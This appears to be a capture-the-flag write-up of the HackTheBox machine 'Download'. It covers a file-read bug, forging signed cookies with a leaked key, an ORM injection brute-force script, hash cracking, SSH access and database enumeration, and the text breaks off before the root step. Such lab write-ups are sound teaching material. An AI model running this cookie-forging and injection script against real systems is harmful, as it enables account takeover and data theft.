HTB: Download
=============

![Download](https://0xdf.gitlab.io/img/download-cover.png)

Download starts off with a cloud file storage solution. I’ll find a subtle file read vulnerability that allows me to read the site’s source. With that source, I’ll identify an ORM injection that allows me to access other user’s files, and to brute force items from the database. With a password hash that is crackable, I’ll get SSH on the box. From there, I’ll identify a root cron that’s dropping to the postgres user to make database queries. I’ll exploit TTY pushback to get execution as root. In Beyond Root, I’ll dig more into the TTY pushback, and look at the file read vuln.

## Box Info

Name[Download](https://www.hackthebox.com/machines/download) [![Download](https://0xdf.gitlab.io/icons/box-download.png)](https://www.hackthebox.com/machines/download)

[Play on HackTheBox](https://www.hackthebox.com/machines/download)Release Date[05 Aug 2023](https://twitter.com/hackthebox_eu/status/1687131278405971968)Retire Date11 Nov 2023OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsHard \[40\]Rated Difficulty![Rated difficulty for Download](https://0xdf.gitlab.io/img/download-diff.png)Radar Graph![Radar chart for Download](https://0xdf.gitlab.io/img/download-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)04:47:50 [![Utopia18](https://www.hackthebox.eu/badge/image/502253)](https://app.hackthebox.com/users/502253)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)18:52:40 [![Utopia18](https://www.hackthebox.eu/badge/image/502253)](https://app.hackthebox.com/users/502253)

Creator[![JoshSH](https://www.hackthebox.eu/badge/image/269501)](https://app.hackthebox.com/users/269501)

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.226
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-06 15:04 EST
Nmap scan report for 10.10.11.226
Host is up (0.097s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.226
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-06 16:18 EST
Nmap scan report for 10.10.11.226
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://download.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 focal.

The website is returning a redirect to `http://download.htb`. Given the use of virtual host routing, I’ll use `ffuf` to fuzz for subdomains that return something different from the main domain, but not find anything. I’ll add `download.htb` to my `/etc/hosts` file.

### download.htb - TCP 80

#### Site

The site is for a file sharing service:

![image-20231106162250080](https://0xdf.gitlab.io/img/image-20231106162250080.png)

There are links at the top for “Upload” ( `/files/upload`) and Login ( `/auth/login`), and the link at the bottom points to `/files/upload` as well.

The upload link gives a form to upload a file:

![image-20231106162524637](https://0xdf.gitlab.io/img/image-20231106162524637.png)

If I give it a file, it returns a page at `/files/view/[guid]` with “Download” and “Copy Link” buttons:

![image-20231106162551496](https://0xdf.gitlab.io/img/image-20231106162551496.png)

“Copy Link” just puts the current URL on the page. Download ( `/files/download/[guid]`) returns the file.

#### Authenticated Site

The “Login” link gives a login form:

![image-20231106162712605](https://0xdf.gitlab.io/img/image-20231106162712605.png)

The “Register Here” link ( `/auth/register`) loads a page that offers the chance to track and delete uploaded file and a form:

![image-20231106162751398](https://0xdf.gitlab.io/img/image-20231106162751398.png)

I’ll create an account (must be at least 6 characters), and it sends me back to the login page. If I try to register the same account again, it returns an error:

![image-20231106162948855](https://0xdf.gitlab.io/img/image-20231106162948855.png)

I could potentially brute force usernames here. Some quick manual guesses don’t find anything.

On logging in, there’s a home page ( `/home`) that shows my uploaded files:

![image-20231106163305547](https://0xdf.gitlab.io/img/image-20231106163305547.png)

On the upload page, there’s now an option for “Mark file as private”:

![image-20231106163332052](https://0xdf.gitlab.io/img/image-20231106163332052.png)

On viewing a file, I now have the option to delete it (both on the view page for the file, and on the home page):

![image-20231106163401560](https://0xdf.gitlab.io/img/image-20231106163401560.png)

Private files show up marked that way:

![image-20231106163454554](https://0xdf.gitlab.io/img/image-20231106163454554.png)

#### Tech Stack

The HTTP response headers show that the site is running ExpressJS:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Nov 2023 21:22:16 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/"d51-5GzI9n7y7raS8vKB6fFHd40C4+U"
Set-Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=; path=/; expires=Mon, 13 Nov 2023 21:22:16 GMT; httponly
Set-Cookie: download_session.sig=4kbZR1kOcZNccDLxiSi7Eblym1E; path=/; expires=Mon, 13 Nov 2023 21:22:16 GMT; httponly
Content-Length: 3409

```

It also sets two cookies on first visiting `/`. `download_session` is base64 and decodes to:

```
{"flashes":{"info":[],"error":[],"success":[]}}

```

The application is passing messages for “flashing” on the page via the cookie, so the same user will have many different cookies.

`download_session.sig` also looks like base64, but it doesn’t decode cleanly. If I add a base64 padding byte to it, it does decode:

```
oxdf@hacky$ echo "4kbZR1kOcZNccDLxiSi7Eblym1E" | base64 -d
FGYq\p2(rQbase64: invalid input
oxdf@hacky$ echo "4kbZR1kOcZNccDLxiSi7Eblym1E=" | base64 -d | xxd
00000000: e246 d947 590e 7193 5c70 32f1 8928 bb11  .F.GY.q.\p2..(..
00000010: b972 9b51                                .r.Q

```

The result is not ASCII, but 20 bytes, which is the length of SHA1. It is likely a signature to prevent tampering with the cookie.

Once I’m logged in, and `download_session` cookie gets longer, adding user information:

```
oxdf@hacky$ echo "eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiMHhkZjB4ZGYifX0=" | base64 -d
{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":16,"username":"0xdf0xdf"}}

```

The signature is still 27 bytes.

If I try to modify the cookie (say, change “0xdf0xdf” to “admin”) without changing the `.sig`, the response just redirects to the login page (because the cookie isn’t valid).

The 404 page on the site is custom to the site:

![image-20231107133911339](https://0xdf.gitlab.io/img/image-20231107133911339.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site with no extensions since the server is JavaScript. When I start, I’ll notice quickly that both `Static` and `static` return the same results. I’ll kill the run and restart with a lowercase word list to speed it up a bit:

```
oxdf@hacky$ feroxbuster -u http://download.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://download.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       56l      166w     2066c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       99l      344w     3409c http://download.htb/
302      GET        1l        4w       33c http://download.htb/home => http://download.htb/auth/login
301      GET       10l       16w      179c http://download.htb/static => http://download.htb/static/
301      GET       10l       16w      187c http://download.htb/static/css => http://download.htb/static/css/
301      GET       10l       16w      185c http://download.htb/static/js => http://download.htb/static/js/
301      GET       10l       16w      191c http://download.htb/static/fonts => http://download.htb/static/fonts/
[####################] - 5m    132920/132920  0s      found:6       errors:0
[####################] - 4m     26584/26584   90/s    http://download.htb/
[####################] - 5m     26584/26584   77/s    http://download.htb/static/
[####################] - 5m     26584/26584   77/s    http://download.htb/static/css/
[####################] - 5m     26584/26584   77/s    http://download.htb/static/js/
[####################] - 5m     26584/26584   77/s    http://download.htb/static/fonts/

```

I’ll try brute forcing `http://download.htb/files/` and `http://download.htb/auth/`, but it doesn’t find anything besides what I know about already. The webserver even returns 404 not found for `/files/view/` (with no idea), so it seems like I’ll need the full API path to get a result.

## Shell as wesley

### Access Site Source

#### Discover Issue

Looking at Burp to see what requests have been happening while interacting with the website, there’s two endpoints involving files:

- `/files/view/<file_id>` returns the page with information about the file and the download and copy link buttons
- `/files/download/<file_id>` \- returns the raw file

Both of these seem like they might interact with a database, so I’ll try adding a simple `'` at the end of the ID for each. The view page redirects to `/files/upload` with a message that say something went wrong:

![image-20231107133640523](https://0xdf.gitlab.io/img/image-20231107133640523.png)

This is not really suspicious, as the same thing happens if just a character in the file id is changed. It could be handling the input correctly and just not finding a file.

The download button just happens in the background, so I’ll move to Burp Repeater. Adding a `'` to the end returns a 404 not found, but different from the 404 page from what I noted [above](#tech-stack):

![image-20231107134010830](https://0xdf.gitlab.io/img/image-20231107134010830.png)

#### Filesystem

One interpretation of the different 404s is that `/files/download` is trying to read files directly from the file system through NGINX, bypassing the Express application entirely (that turns out not to be what’s happening here, but it sent me down this path).

I’ll immediately try to read `/etc/passwd`, but it doesn’t work:

![image-20231107134644853](https://0xdf.gitlab.io/img/image-20231107134644853.png)

Another check with the file system is to include extra `/`, as a Linux file system will not mind extra slashes. Adding one before the file ID leads to the Express 404:

![image-20231107134904622](https://0xdf.gitlab.io/img/image-20231107134904622.png)

However, if I URL-encode `/` to `%2f`, then it loads the file!

![image-20231107135006342](https://0xdf.gitlab.io/img/image-20231107135006342.png)

The fact that an extra `/` didn’t break the request is a good sign the site could be loading files from the filesystem.

#### Proving File Read

Even with URL-encoded slash, I still can’t read `/etc/passwd`.

There’s a couple ways to prove that there’s a file read vulnerability in this site. The first is to guess at the name of the directory that holds the uploaded files. After trying `files`, `upload`, `uploads` works:

![image-20231107135617874](https://0xdf.gitlab.io/img/image-20231107135617874.png)

I could also think about the kinds of files I would expect in the next directory up. This is a Node application, so it’s fair to think there’s a `package.json`, as well as a main file that’s something like `app.js` or `main.js` or `server.js`. `package.json` works (and shows the name of the main file is `app.js`):

![image-20231107135752076](https://0xdf.gitlab.io/img/image-20231107135752076.png)

### Source Analysis

#### package.json

The `package.json` [file](https://heynode.com/tutorial/what-packagejson/) is a standard file in a Node project that describes an application, how to interact with it, and what it’s dependencies are. In this case, it starts by showing the `main` function is in `app.js`, as well as defining scripts for tests (nothing but an `echo`), `dev` (running `./src/app.ts`), and `build` (calling `tsc`, which is a TypeScript comilier):

```
{
  "name": "download.htb",
  "version": "1.0.0",
  "description": "",
  "main": "app.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "dev": "nodemon --exec ts-node --files ./src/app.ts",
    "build": "tsc"
  },

```

Next it gives an author:

```
  "keywords": [],
  "author": "wesley",
  "license": "ISC",

```

I’ll want to keep this in mind as a potential username (though it’s not registered on the website already).

Finally, it gives the packages that are used (including some used only for development):

```
  "dependencies": {
    "@prisma/client": "^4.13.0",
    "cookie-parser": "^1.4.6",
    "cookie-session": "^2.0.0",
    "express": "^4.18.2",
    "express-fileupload": "^1.4.0",
    "zod": "^3.21.4"
  },
  "devDependencies": {
    "@types/cookie-parser": "^1.4.3",
    "@types/cookie-session": "^2.0.44",
    "@types/express": "^4.17.17",
    "@types/express-fileupload": "^1.4.1",
    "@types/node": "^18.15.12",
    "@types/nunjucks": "^3.2.2",
    "nodemon": "^2.0.22",
    "nunjucks": "^3.2.4",
    "prisma": "^4.13.0",
    "ts-node": "^10.9.1",
    "typescript": "^5.0.4"
  }
}

```

[Prisma](https://www.prisma.io/) is an ORM for interacting with a database, `cookie-parser` is [ExpressJS middleware](https://expressjs.com/en/resources/middleware/cookie-parser.html) for getting cookies, `cookie-session` is what is adding the `.sig` cookie (source [here](https://github.com/expressjs/cookie-session)).

#### app.js

`app.js` starts by importing the necessary libraries:

```
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const nunjucks_1 = __importDefault(require("nunjucks"));
const path_1 = __importDefault(require("path"));
const cookie_parser_1 = __importDefault(require("cookie-parser"));
const cookie_session_1 = __importDefault(require("cookie-session"));
const flash_1 = __importDefault(require("./middleware/flash"));
const auth_1 = __importDefault(require("./routers/auth"));
const files_1 = __importDefault(require("./routers/files"));
const home_1 = __importDefault(require("./routers/home"));
const client_1 = require("@prisma/client");
const app = (0, express_1.default)();
const port = 3000;
const client = new client_1.PrismaClient();
const env = nunjucks_1.default.configure(path_1.default.join(__dirname, "views"), {
    autoescape: true,
    express: app,
    noCache: true,
});

```

Then it configures these, including `cookie-session`:

```
app.use((0, cookie_session_1.default)({
    name: "download_session",
    keys: ["8929874489719802418902487651347865819634518936754"],
    maxAge: 7 * 24 * 60 * 60 * 1000,
}));
app.use(flash_1.default);
app.use(express_1.default.urlencoded({ extended: false }));
app.use((0, cookie_parser_1.default)());
app.use("/static", express_1.default.static(path_1.default.join(__dirname, "static")));

```

That `key` is likely what I need to sign cookies.

Next it defines routes:

```
app.get("/", (req, res) => {
    res.render("index.njk");
});
app.use("/files", files_1.default);
app.use("/auth", auth_1.default);
app.use("/home", home_1.default);
app.use("*", (req, res) => {
    res.render("error.njk", { statusCode: 404 });
});

```

It is loading more files that container additional routes. `files_1.default` is defined at the top as `./routers/files` (which has an implied `.js`)

At the bottom of the file is another odd bit:

```
app.listen(port, process.env.NODE_ENV === "production" ? "127.0.0.1" : "0.0.0.0", () => {
    console.log("Listening on ", port);
    if (process.env.NODE_ENV === "production") {
        setTimeout(async () => {
            await client.$executeRawUnsafe(`COPY (SELECT "User".username, sum("File".size) FROM "User" INNER JOIN "File" ON "File"."authorId" = "User"."id" GROUP BY "User".username) TO '/var/backups/fileusages.csv' WITH (FORMAT csv);`);
        }, 300000);
    }
});

```

This is doing some kind of listener on localhost that’s running raw SQL queries to keep stats about file usage. I’ll need this later.

#### home.js

The home page is very simple, just giving a list of files for the logged in user. The routes in `routers/home.js` show just that:

```
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const client_1 = require("@prisma/client");
const express_1 = __importDefault(require("express"));
const auth_1 = __importDefault(require("../middleware/auth"));
const client = new client_1.PrismaClient();
const router = express_1.default.Router();
router.get("/", auth_1.default, async (req, res) => {
    const files = await client.file.findMany({
        where: { author: req.session.user },
        select: {
            id: true,
            uploadedAt: true,
            size: true,
            name: true,
            private: true,
            authorId: true,
            author: {
                select: {
                    username: true,
                },
            },
        },
    });
    res.render("home.njk", { files });
});
exports.default = router;

```

It’s mostly just a big Prisma query based on `req.session.user` as the filter.

### Forge Cookie

There is clearly some kind of cookie signing going on, and I have access to a key. I want to understand how it is doing that signing so I can try to forge cookies.

#### Identify Package

The cookie object is initialized using this line:

```
app.use((0, cookie_session_1.default)({
    name: "download_session",
    keys: ["8929874489719802418902487651347865819634518936754"],
    maxAge: 7 * 24 * 60 * 60 * 1000,
}));

```

`cookie_session_1` is defined at the top:

```
const cookie_session_1 = __importDefault(require("cookie-session"));

```

I can search for “cookie-session” in the [npm index](https://www.npmjs.com/package/index) and find the package:

![image-20231107070552128](https://0xdf.gitlab.io/img/image-20231107070552128.png)

This points to the [GitHub repo](https://github.com/expressjs/cookie-session) for the project.

The entire thing lives in `index.js`. On lines [61-63](https://github.com/expressjs/cookie-session/blob/master/index.js#L61-L63), the cookies are passed into a new `Cookies` object:

```
    var cookies = new Cookies(req, res, {
      keys: keys
    })

```

`Cookies` is defined on [line 17](https://github.com/expressjs/cookie-session/blob/master/index.js#L17):

```
var Cookies = require('cookies')

```

This package exists in NPM as well:

![image-20231107073523912](https://0xdf.gitlab.io/img/image-20231107073523912.png)

And is on GitHub [here](https://github.com/pillarjs/cookies).

#### cookies

The cookies package README talks about the `.sig` cookies, which is a good sign this is the correct package:

> **Unobtrusive**: Signed cookies are stored the same way as unsigned cookies, instead of in an obfuscated signing format. An additional signature cookie is stored for each signed cookie, using a standard naming convention ( _cookie-name_ `.sig`). This allows other libraries to access the original cookies without having to know the signing mechanism.

I came prepared to go into the source, but the README also talks about the signature:

> ### \[new Cookies(request, response \[, options\\\])\]
>
> Create a new cookie jar for a given `request` and `response` pair. The `request` argument is a [Node.js HTTP incoming request object](https://nodejs.org/dist/latest-v16.x/docs/api/http.html#class-httpincomingmessage) and the `response` argument is a [Node.js HTTP server response object](https://nodejs.org/dist/latest-v16.x/docs/api/http.html#class-httpserverresponse).
>
> A [Keygrip](https://www.npmjs.com/package/keygrip) object or an array of keys can optionally be passed as `options.keys` to enable cryptographic signing based on SHA1 HMAC, using rotated credentials.

It is using SHA1 HMAC. I could have guessed that with the [analysis above](#tech-stack), but sometimes it won’t be that easy.

#### Sign

That’s enough information to start playing with some cookies the site provided and see if I can recreate the signature. The empty cookies before looking in looks like:

```
download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=
download_session.sig=4kbZR1kOcZNccDLxiSi7Eblym1E

```

[Cyberchef](https://gchq.github.io/CyberChef) is a nice place to play with this because I can use the various functions to easily try different things. There’s a HMAC recipe that allows me to select SHA1 and give a key. It’s not clear wha the format of the key should be:

![image-20231107074730768](https://0xdf.gitlab.io/img/image-20231107074730768.png)

It’s all digits. It _could_ be hex or even Base64, but with no letters, both seem unlikely. Decimal seems like a weird way to do it. I’ll notice that for this key, UTF-8 and Latin1 make the same output. I’ll try UTF-8 for now (knowing I could come back and change it later).

The result is a 40 character hex hash:

![image-20231107075010544](https://0xdf.gitlab.io/img/image-20231107075010544.png)

The signature cookie is 27 characters that look like base64. If I base64-encode these 40 characters, the result is 56 characters. However, if I convert the hex to bytes first, the result is 28:

![image-20231107075116446](https://0xdf.gitlab.io/img/image-20231107075116446.png)

And, the cookie didn’t have a the “=” padding on the end, so if I drop that, I’ve got a probable match.

Unfortunately, that doesn’t match my signature cookie, `4kbZR1kOcZNccDLxiSi7Eblym1E`. I’ll try playing with the key format, but no luck.

Another thing to consider is what is being signed. I put the cookie value in. But what if the name is included as well? That works!

![image-20231107075308465](https://0xdf.gitlab.io/img/image-20231107075308465.png)

I can verify with some other logged in cookies, and they work as well.

### ORM Injection

#### Background

Above I noted that `home.js` is using the `user` object from the cookie as the criteria for querying what rows come back.

```
    const files = await client.file.findMany({
        where: { author: req.session.user },
        select: {
...snip...
            },
        },
    });

```

So with this cookie:

```
{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":16,"username":"0xdf0xdf"}}

```

It is querying for files associated with a user that has user id 16 and the username “0xdf0xdf”.

ORMs use models to give the programmer a more intuitive way to access objects in the database. In this case, the developer assumed that an attacker wouldn’t be able to modify the user in the cookie, and therefore, just trusts the cookie to query appropriately.

#### All Files / Users

What happens if I send in the cookie so that the user is empty:

```
{"flashes":{"info":[],"error":[],"success":[]},"user":{}}

```

My hope is that it will return all the files for all the user, as there’s no filter.

That base64 encodes to `eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6e319` which has a signature of `RdmrvnrBpzrS3slS77uG7Cuiv-Q`. When I add this to Firefox and reload `/home`, it works:

![image-20231107142010370](https://0xdf.gitlab.io/img/image-20231107142010370.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

There are tons of files from different users on the page.

To get a better feel, I’ll go into Burp, find this request, right click, and select “Copy as curl”, and then move to a terminal. I can remove a bunch of stuff (and make sure to remove the accept gzip so that the data comes back as ASCII) and end up with something like this to count:

```
oxdf@hacky$ curl -s -H 'Host: download.htb' -H 'Referer: http://download.htb/auth/login' -b 'download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6e319; download_session.sig=RdmrvnrBpzrS3slS77uG7Cuiv-Q' http://download.htb/home/
> | grep "Uploaded By:" | wc -l
27
oxdf@hacky$ curl -s -H 'Host: download.htb' -H 'Referer: http://download.htb/auth/login' -b 'download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6e319; download_session.sig=RdmrvnrBpzrS3slS77uG7Cuiv-Q' http://download.htb/home/
> | grep "Uploaded By:" | sort -u | wc -l
16
oxdf@hacky$ curl -s -H 'Host: download.htb' -H 'Referer: http://download.htb/auth/login' -b 'download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6e319; download_session.sig=RdmrvnrBpzrS3slS77uG7Cuiv-Q' http://download.htb/home/
> | grep "Uploaded By:" | sort -u
        <strong>Uploaded By: </strong>0xdf0xdf<br />
        <strong>Uploaded By: </strong>Anonymous<br />
        <strong>Uploaded By: </strong>Antilogism<br />
        <strong>Uploaded By: </strong>Apoplectic<br />
        <strong>Uploaded By: </strong>AyufmApogee<br />
        <strong>Uploaded By: </strong>Bold_pecAplomb<br />
        <strong>Uploaded By: </strong>Hindermate<br />
        <strong>Uploaded By: </strong>Jalouse<br />
        <strong>Uploaded By: </strong>Logorrhea<br />
        <strong>Uploaded By: </strong>Pestiferous<br />
        <strong>Uploaded By: </strong>Rooirhebok<br />
        <strong>Uploaded By: </strong>StrachanMilt<br />
        <strong>Uploaded By: </strong>Tabific<br />
        <strong>Uploaded By: </strong>Vivacious<br />
        <strong>Uploaded By: </strong>WESLEY<br />
        <strong>Uploaded By: </strong>ZitaShneee<br />

```

There are 27 files from 16 unique users.

I’ll spend some time reading each of the files, but nothing interesting comes from it.

#### Identify Password Column

Presumable the user object in the database has a field storing the password (likely a password hash). If I put in a query with a bad column name, the application crashes and a 502 comes back. For example, if I try `{"user":{"hash":{}}}`, that makes a cookie of `eyJ1c2VyIjp7Imhhc2giOnt9fX0=` and a sig of `o8bjoAGTBkr0Gwr62EwKyGD4wC4`. When I send that, it crashes:

![image-20231107152611960](https://0xdf.gitlab.io/img/image-20231107152611960.png)

However, if I change it to `{"user":{"password":{}}}`, it returns all the documents:

![image-20231107152812106](https://0xdf.gitlab.io/img/image-20231107152812106.png)

That means the correct column name is password, and its showing all the documents with a user that has any password!

#### Brute Force Password

The [Prisma documentation](https://www.prisma.io/docs/concepts/components/prisma-client/filtering-and-sorting) shows examples that use things like `{"password": {startsWith: "a"}}`. If that works here, I can use that to brute force the password character by character. I found for it to work, I had to put `startsWith` in double quotes, but it does work. For example, `{"user":{"password":{"startsWith": "1"}}}` returns documents from both Tabific and AyufmApogee:

![image-20231107153428075](https://0xdf.gitlab.io/img/image-20231107153428075.png)

With this together, I can brute force passwords for users with this script:

```
import hashlib
import hmac
import requests
import sys

KEY = b"8929874489719802418902487651347865819634518936754"
HEX_CHARS = '0123456789abcdef'

def make_cookies(user_id, password):
    pt_cookie = f'{{"user": {{"id": {user_id}, "password": {{"startsWith": "{password}"}}}}}}'
    enc_cookie = base64.b64encode(pt_cookie.encode()).decode()
    full_cookie_b = f'download_session={enc_cookie}'
    digest = hmac.new(KEY, full_cookie_b.encode(), hashlib.sha1).digest()
    sig = base64.urlsafe_b64encode(digest).decode().rstrip("=")

    return {"download_session": enc_cookie, "download_session.sig": sig}

if len(sys.argv) == 1:
    user_id = 1
else:
    user_id = int(sys.argv[1])

password = ""
while True:
    done = True
    for c in HEX_CHARS:
        cookies = make_cookies(user_id, password + c)
        print(f"\r{password}{c}", end="")
        resp = requests.get('http://download.htb/home/', cookies=cookies)
        if "No files found" not in resp.text:
            password += c
            done = False
            break
    if done:
        print(f"\r{password}   ")
        break

```

The `make_cookies` function will generate the cookie and signature, returning a dictionary with the cookie names and values. In the main program, I’ll start with an empty password, and loop over each possible hex character (I’m assuming this is a hash) and if it gets back a page without “No files found”, then I know that’s the next character in the password. It appends that character to the password, and starts the loop again. Only if it tries all the characters and finds no match does it exit.

It takes about a minute to run:

![](https://0xdf.gitlab.io/img/download-password-bruteforce.gif)

I can use the same script to get hashes for the other users as well, but I’m most interested in wesley as they are also the author of the package, and therefore most likely to have an account on Download.

### SSH

#### Crack Hash

I’ll save that hash to a file and pass it to `hashcat`. The detect mode comes up with a bunch of formats that it could be:

```
$ hashcat wesley.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting
...[snip]...
The following 11 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)

Please specify the hash-mode with -m [hash-mode].

```

I’ll try with basic MD5 ( `-m 0`) and it cracks instantly:

```
$ hashcat -m 0 wesley.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting
...[snip]...
f88976c10af66915918945b9679b2bd3:dunkindonuts

```

#### SSH

That password works as wesley on Download over SSH:

```
oxdf@hacky$ sshpass -p dunkindonuts ssh wesley@download.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-155-generic x86_64)
...[snip]...
wesley@download:~$

```

And I get `user.txt`:

```
wesley@download:~$ cat user.txt
a38f00da************************

```

## Shell as root

### Enumeration

#### Home Directory / File System

There’s nothing else of interest in wesley’s home directory:

```
wesley@download:~$ ls -la
total 40
drwxr-xr-x 5 wesley wesley 4096 Jul 19 15:35 .
drwxr-xr-x 3 root   root   4096 Jul 19 15:35 ..
lrwxrwxrwx 1 root   root      9 Apr 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 wesley wesley  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 wesley wesley 3771 Feb 25  2020 .bashrc
drwx------ 2 wesley wesley 4096 Jul 19 15:35 .cache
drwxrwxr-x 3 wesley wesley 4096 Jul 19 15:35 .local
-rw-r--r-- 1 wesley wesley  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 Apr 21  2023 .psql_history -> /dev/null
drwx------ 2 wesley wesley 4096 Jul 19 15:35 .ssh
-rw-r----- 1 root   wesley   33 Nov  6 19:52 user.txt
-rw-r--r-- 1 wesley wesley   39 Jul 17 11:58 .vimrc

```

There are no other user home directories in `/home`, and `/opt` and `/srv` are empty as well.

#### Web

`/var/www` has two folders, `html` and `app`. `html` just has the default nginx page. `app` has the download app that I exploited already:

```
wesley@download:/var/www/app$ ls
app.js  middleware  node_modules  package.json  routers  static  uploads  views

```

The app is very much like I figured out using the file read vulnerability. Interestingly, no where in this directory does it configure how it connects to a database.

`netstat` shows a service on 5432, which is the default port for PostGreSQL:

```
wesley@download:/var/www/app$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -

```

The connection string is actually in an environment variable set when NodeJS starts as a service:

```
wesley@download:/etc/systemd/system$ cat download-site.service
[Unit]
Description=Download.HTB Web Application
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/app/
ExecStart=/usr/bin/node app.js
Restart=on-failure
Environment=NODE_ENV=production
Environment=DATABASE_URL="postgresql://download:CoconutPineappleWatermelon@localhost:5432/download"

[Install]
WantedBy=multi-user.target

```

#### Database

The password “CoconutPineappleWatermelon” works to connect:

```
wesley@download:~$ psql -h 127.0.0.1 -U download download
Password for user download:
psql (12.15 (Ubuntu 12.15-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

download=>

```

There are four databases:

```
download=> \list
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-----------+----------+----------+-------------+-------------+-----------------------
 download  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =Tc/postgres         +
           |          |          |             |             | postgres=CTc/postgres+
           |          |          |             |             | download=CTc/postgres
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
